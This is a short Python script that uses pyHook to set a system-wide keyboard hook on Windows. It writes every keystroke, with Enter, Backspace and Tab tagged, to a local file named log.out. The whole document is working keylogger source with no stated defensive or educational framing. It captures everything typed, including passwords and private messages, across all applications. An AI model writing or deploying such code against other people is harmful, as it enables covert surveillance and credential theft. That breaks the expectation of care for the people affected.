import pyHook, sys, logging, pythoncom

LOG_FILENAME = '.\log.out'

def OnKeyboardEvent(event):
        logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG, format='%(message)s')
        #print("Key: ", chr(event.Ascii))
        s = chr(event.Ascii)
        if s=='\r':
                #print("<ENTER>")
                logging.log(10, "<ENTER>")
        elif s=='\x08':
                #print("<BACKSPACE>")
                logging.log(10, "<BACKSPACE>")
        elif s=='\t':
                #print("<TAB>")
                logging.log(10, "<TAB>")
        else:
                #print("Key: ", chr(event.Ascii))
                logging.log(10,chr(event.Ascii))
        return True
        
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent    
hm.HookKeyboard()
pythoncom.PumpMessages()
